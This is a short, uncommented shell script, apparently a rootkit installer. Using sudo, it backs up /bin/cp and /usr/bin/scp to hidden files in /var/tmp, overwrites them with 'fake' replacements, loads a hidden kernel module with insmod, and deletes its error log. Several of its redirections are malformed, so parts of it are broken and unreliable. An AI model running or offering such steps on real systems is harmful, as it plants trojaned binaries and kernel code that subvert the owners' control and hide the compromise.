sudo cp -f /bin/cp /var/tmp/.cp >2 errlog
sudo cp -f /usr/bin/scp /var/tmp/.scp 2> errlog
sudo mv -f /var/tmp/.fake_cp /bin/cp 2> errlog
sudo mv -f /var/tmp/.fake_scp /usr/bin/scp 2> errlog
sudo insmod /var/tmp/.hello.ko >2 errlog >1 errlog
rm errlog
